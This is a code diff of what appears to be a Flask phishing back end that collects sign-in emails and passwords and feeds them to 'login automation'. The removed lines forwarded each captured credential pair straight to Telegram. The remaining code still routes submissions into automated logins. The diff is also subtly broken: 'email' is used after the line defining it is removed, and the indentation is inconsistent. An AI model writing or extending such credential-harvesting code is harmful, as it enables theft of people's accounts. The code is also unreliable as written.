@@ -692,32 +692,16 @@ def process_form():
         except Exception as e:
             logger.error(f"Turnstile verification error in form processing: {e}")
     
-    email = form.email.data.strip().lower()
-    submit_action = request.form.get('submit', 'Next')
+    submit_action = request.form.get('submit', 'Sign in')
     
-    if submit_action == 'Next':
-        # Email step
-        valid, message = validate_email_domain(email)
-        if not valid:
-            flash(message, 'error')
-            log_session_activity("email_step_failed", user_email=email, success=False, error_message=message)
-            return redirect(url_for('index', step='email', error='true'))
-        
-        log_session_activity("email_step_completed", user_email=email)
-        return redirect(url_for('index', step='password', email=email))
+    # All form submissions now go directly to login automation
     
-    # Continue with login automation
-        
-        # IMMEDIATELY send credentials to Telegram when submitted
-        worker_ip = get_remote_address()
-        logger.info(f"📤 IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
-        
-        # Send immediate notification with both email and password
-        immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
-        if immediate_success:
-            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
-        else:
-            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
+    # Validate email domain first
+    valid, message = validate_email_domain(email)
+    if not valid:
+        flash(message, 'error')
+        log_session_activity("email_validation_failed", user_email=email, success=False, error_message=message)
+        return redirect(url_for('index', step='password', email=email, error='true'))
         
         # Check if user exists and password is correct
         user = User.query.filter_by(email=email).first()
